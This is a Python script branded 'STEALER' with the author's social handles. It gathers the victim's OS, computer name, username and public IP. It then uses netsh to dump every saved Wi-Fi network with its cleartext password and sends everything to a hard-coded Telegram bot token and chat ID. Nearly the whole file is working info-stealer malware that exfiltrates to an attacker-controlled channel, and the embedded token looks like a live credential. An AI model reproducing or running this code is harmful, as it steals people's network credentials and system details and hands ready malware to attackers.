import telebot
import platform
import subprocess
import getpass
from requests import get
import os
import datetime
os.system('pip install pyTelegramBotAPI')
os.system('cls')
banner = '''

\033[1;31;40m

  ██████ ▄▄▄█████▓▓█████ ▄▄▄       ██▓    ▓█████  ██▀███  
▒██    ▒ ▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒    ▓█   ▀ ▓██ ▒ ██▒
░ ▓██▄   ▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▒██░    ▒███   ▓██ ░▄█ ▒
  ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██░    ▒▓█  ▄ ▒██▀▀█▄  
▒██████▒▒  ▒██▒ ░ ░▒████▒▓█   ▓██▒░██████▒░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒  ░ ░    ░     ░ ░  ░ ▒   ▒▒ ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░
░  ░  ░    ░         ░    ░   ▒     ░ ░      ░     ░░   ░ 
      ░              ░  ░     ░  ░    ░  ░   ░  ░   ░     
                                                          

.================================================.
\033[1;36;40mcontact with me 
Telegram : @ZerOneByte
Instagram: @ZerOne.Byte
Github:@ZerOne-Byte
'''
print(banner)
#--------- TELEGRAM BOT ----------
token = '1024082324:AAGOhNBtkjvzwgVQQ4H9FnYY1d8-IUubJBg'
chat_id = 411099265
bot = telebot.TeleBot(token)
bot.send_message(chat_id,'************************')
#--------- SYSTEM ----------
os = platform.platform()
PCname = platform.node()
username = getpass.getuser()
try:
    ip_Address = get('http://ip.42.pl/raw').text
except:
    ip_Address='NONE'
out= f'platform : {os} \nPC name : {PCname} \nUser Name : {username} \nIP Address : {ip_Address} \n'
print(out)
bot.send_message(chat_id,out)
#--------- WIFI ---------
data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
print('*'*60)
print('     SSID                    Password')
for i in profiles:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    
    try:
        
        out = "{:<25}|  {:<}".format(i, results[0])
        print (out)
        bot.send_message(chat_id,out)
    except IndexError:
        print ("{:<25}|  {:<}".format(i, ""))
